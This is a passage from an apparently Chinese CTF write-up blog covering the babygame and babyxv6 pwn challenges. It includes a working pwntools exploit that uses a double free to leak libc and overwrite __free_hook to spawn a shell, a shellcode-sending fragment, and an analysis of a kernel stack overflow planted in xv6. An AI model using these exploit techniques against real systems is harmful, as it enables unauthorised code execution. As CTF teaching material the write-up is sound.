</span><span class="s1">&#39;&#39;&#39;</span>


<span class="n">virtual_stack</span> <span class="o">=</span> <span class="mh">0x40008006b0</span> <span class="o">-</span> <span class="mh">0x118</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">gen_shellcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x120</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">virtual_stack</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">qemu_base</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="babygame">babygame</h2>
<p>是一个推箱子游戏，每次只能移动一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">(pwn) pwn@ubuntu:~/share/starctf/pwn_babygame$ ./pwn
Please input an level from 1-9:
1
Map:
   ███  
   █○█  
████□█  
█○ □♀███
███□ □○█
  █ ████
  █○█   
  ███   

Please input an order:
123
Wrong input, type &#39;h&#39; for help
Please input an order:
h
     Sokoban    
How to Play:
    Push all boxs into target place
Map:
    1)█:wall
    2)○:Target
    3)□:Box
    4)♀:Player
    5)●:Box on target
Command:
    1)h: show this message
    2)q: quit the game
    3)w: move up
    4)s: move down
    5)a: move left
    6)d: move right
    7)b: move back
    8)m: leave message
    k)n: show name
    10)l: show message

Please input an order:
</code></pre></td></tr></table>
</div>
</div><p>玩着玩着就崩了&hellip;出题人复盘的时候说这题该给源码的，C++我实在是逆不明白&hellip;</p>
<p>我们走完一关以后选择level2，q退出以后会触发double free(ubuntu2004)。给的libc是2.27，跑到ubuntu1804继续玩下去，l意外地泄露了libc地址，猜测有什么东西被free后进入unsorted bin</p>
<p>官方wp有点问题&hellip;改了一下 ubuntu18.04能打通</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please input an level from 1-9:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
<span class="n">step</span> <span class="o">=</span> <span class="s2">&#34;wsaadsswdd&#34;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">step</span><span class="p">:</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please input an order:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please input an level from 1-9:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please input an order:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;q&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;leave your name?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;restart?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please input an level from 1-9:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;l&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;message:&#34;</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc_base : @&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">info</span><span class="p">):</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please input an level from 1-9:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;q&#39;</span><span class="p">)</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;leave your name?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span><span class="p">)</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;your name:&#34;</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;restart?&#34;</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">libc</span>
<span class="n">freehook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;freehook : @&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">freehook</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">freehook</span><span class="p">)</span> 
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;system : @&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> 
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please input an level from 1-9&#34;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span> 
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Please input an order:&#34;</span><span class="p">,</span><span class="s1">&#39;m</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;message:&#34;</span><span class="p">,</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Please input an order:&#34;</span><span class="p">,</span><span class="s1">&#39;q</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> 
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;leave your name?&#34;</span><span class="p">,</span><span class="s1">&#39;n</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>  

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="babyxv6">babyxv6</h2>
<ul>
<li>share：编译好的
<ul>
<li>fs.img：文件系统镜像</li>
<li>kernel：内核</li>
<li>run.sh：启动脚本</li>
</ul>
</li>
<li>src：源码</li>
</ul>
<p>找到user的源码，程序执行逻辑如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">challenge</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mh">0x80</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to babystack 2021!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;How many bytes do you want to send?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    
    <span class="n">size</span> <span class="o">=</span> <span class="n">readnum</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You are greedy!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;show me your input</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
    <span class="n">baby</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;It&#39;s time to say goodbye.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>sysproc.中增加了sys_baby系统调用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">uint64</span>
<span class="nf">sys_baby</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
    <span class="n">uint64</span> <span class="n">p</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">pad</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">argint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">argaddr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">do_overflow</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">uint64</span>
<span class="nf">do_overflow</span><span class="p">(</span><span class="n">uint64</span> <span class="n">src</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
    <span class="k">return</span> <span class="n">copyin</span><span class="p">(</span><span class="n">myproc</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">pagetable</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>copyin调用了memmove，从用户栈传n个字节到dst</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Copy from user to kernel.
</span><span class="c1">// Copy len bytes to dst from virtual address srcva in a given page table.
</span><span class="c1">// Return 0 on success, -1 on error.
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">copyin</span><span class="p">(</span><span class="n">pagetable_t</span> <span class="n">pagetable</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="n">uint64</span> <span class="n">srcva</span><span class="p">,</span> <span class="n">uint64</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">uint64</span> <span class="n">n</span><span class="p">,</span> <span class="n">va0</span><span class="p">,</span> <span class="n">pa0</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">va0</span> <span class="o">=</span> <span class="n">PGROUNDDOWN</span><span class="p">(</span><span class="n">srcva</span><span class="p">);</span>
        <span class="n">pa0</span> <span class="o">=</span> <span class="n">walkaddr</span><span class="p">(</span><span class="n">pagetable</span><span class="p">,</span> <span class="n">va0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">pa0</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">n</span> <span class="o">=</span> <span class="n">PGSIZE</span> <span class="o">-</span> <span class="p">(</span><span class="n">srcva</span> <span class="o">-</span> <span class="n">va0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="n">len</span><span class="p">)</span>
            <span class="n">n</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
        <span class="n">memmove</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">pa0</span> <span class="o">+</span> <span class="p">(</span><span class="n">srcva</span> <span class="o">-</span> <span class="n">va0</span><span class="p">)),</span> <span class="n">n</span><span class="p">);</span> <span class="c1">// user stack -&gt; dst[0:n]
</span><span class="c1"></span>
        <span class="n">len</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">dst</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">srcva</span> <span class="o">=</span> <span class="n">va0</span> <span class="o">+</span> <span class="n">PGSIZE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>调用链为：</p>
<ul>
<li>baby(input, size)</li>
<li>do_overflow(p, n)  p = input, n = size</li>
<li>memmove(dst, src, n) dst = buf, src = input, n = size</li>
</ul>
<p>所以baby()是将input的内容传size大小给do_overflow()中的buf[0x20]，由于size可控，所以可以溢出内核态的buf</p>
<p>这里的思路的是利用do_overflow返回时的寄存器<code>a0,a1,a2</code>分别正好是<code>0, (void *)(pa0 + (srcva - va0)), n</code>，如果返回到read函数就能直接往用户栈上读，做riscv用户态的栈溢出</p>
<p>把kernel objdump下来，返回地址在buf+0x28处</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">00000000800041be &lt;do_overflow&gt;:
    800041be:	7139                	addi	sp,sp,-64
    800041c0:	fc06                	sd	ra,56(sp)   # ra = sp+56
    800041c2:	f822                	sd	s0,48(sp)   
    800041c4:	0080                	addi	s0,sp,64    # s0 -&gt; stack_top
    800041c6:	fca43423          	sd	a0,-56(s0)
    800041ca:	87ae                	mv	a5,a1
    800041cc:	fcf42223          	sw	a5,-60(s0)
    800041d0:	ffffe097          	auipc	ra,0xffffe
    800041d4:	450080e7          	jalr	1104(ra) # 80002620 &lt;myproc&gt;
    800041d8:	87aa                	mv	a5,a0
    800041da:	6bbc                	ld	a5,80(a5)
    800041dc:	fc442683          	lw	a3,-60(s0)
    800041e0:	fd040713          	addi	a4,s0,-48  # a4 = s0-48 = sp+16
    800041e4:	fc843603          	ld	a2,-56(s0)
    800041e8:	85ba                	mv	a1,a4   # a4 -&gt; buf
    800041ea:	853e                	mv	a0,a5
    800041ec:	ffffe097          	auipc	ra,0xffffe
    800041f0:	fd4080e7          	jalr	-44(ra) # 800021c0 &lt;copyin&gt;
    800041f4:	87aa                	mv	a5,a0
    800041f6:	853e                	mv	a0,a5
    800041f8:	70e2                	ld	ra,56(sp)
    800041fa:	7442                	ld	s0,48(sp)
    800041fc:	6121                	addi	sp,sp,64
    800041fe:	8082                	ret
</code></pre></td></tr></table>
</div>
</div><p>接下来是内核态的一些函数</p>
<ul>
<li>在内核里read由consoleread()实现</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// console.c
</span><span class="c1"></span><span class="n">consoleinit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">initlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cons</span><span class="p">.</span><span class="n">lock</span><span class="p">,</span> <span class="s">&#34;cons&#34;</span><span class="p">);</span>

  <span class="n">uartinit</span><span class="p">();</span>

  <span class="c1">// connect read and write system calls
</span><span class="c1"></span>  <span class="c1">// to consoleread and consolewrite.
</span><span class="c1"></span>  <span class="n">devsw</span><span class="p">[</span><span class="n">CONSOLE</span><span class="p">].</span><span class="n">read</span> <span class="o">=</span> <span class="n">consoleread</span><span class="p">;</span>
  <span class="n">devsw</span><span class="p">[</span><span class="n">CONSOLE</span><span class="p">].</span><span class="n">write</span> <span class="o">=</span> <span class="n">consolewrite</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>usertrap用于响应用户态的syscall、异常等，在最后利用usertrapret()返回到用户态</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">//
</span><span class="c1">// handle an interrupt, exception, or system call from user space.
</span><span class="c1">// called from trampoline.S
</span><span class="c1">//
</span><span class="c1"></span><span class="kt">void</span>
<span class="nf">usertrap</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">which_dev</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="k">if</span><span class="p">((</span><span class="n">r_sstatus</span><span class="p">()</span> <span class="o">&amp;</span> <span class="n">SSTATUS_SPP</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">panic</span><span class="p">(</span><span class="s">&#34;usertrap: not from user mode&#34;</span><span class="p">);</span>

  <span class="c1">// send interrupts and exceptions to kerneltrap(),
</span><span class="c1"></span>  <span class="c1">// since we&#39;re now in the kernel.
</span><span class="c1"></span>  <span class="n">w_stvec</span><span class="p">((</span><span class="n">uint64</span><span class="p">)</span><span class="n">kernelvec</span><span class="p">);</span>

  <span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">myproc</span><span class="p">();</span>
  
  <span class="c1">// save user program counter.
</span><span class="c1"></span>  <span class="n">p</span><span class="o">-&gt;</span><span class="n">trapframe</span><span class="o">-&gt;</span><span class="n">epc</span> <span class="o">=</span> <span class="n">r_sepc</span><span class="p">();</span>
  
  <span class="k">if</span><span class="p">(</span><span class="n">r_scause</span><span class="p">()</span> <span class="o">==</span> <span class="mi">8</span><span class="p">){</span>
    <span class="c1">// system call
</span><span class="c1"></span>
    <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">killed</span><span class="p">)</span>
      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>

    <span class="c1">// sepc points to the ecall instruction,
</span><span class="c1"></span>    <span class="c1">// but we want to return to the next instruction.
</span><span class="c1"></span>    <span class="n">p</span><span class="o">-&gt;</span><span class="n">trapframe</span><span class="o">-&gt;</span><span class="n">epc</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>

    <span class="c1">// an interrupt will change sstatus &amp;c registers,
</span><span class="c1"></span>    <span class="c1">// so don&#39;t enable until done with those registers.
</span><span class="c1"></span>    <span class="n">intr_on</span><span class="p">();</span>

    <span class="n">syscall</span><span class="p">();</span>
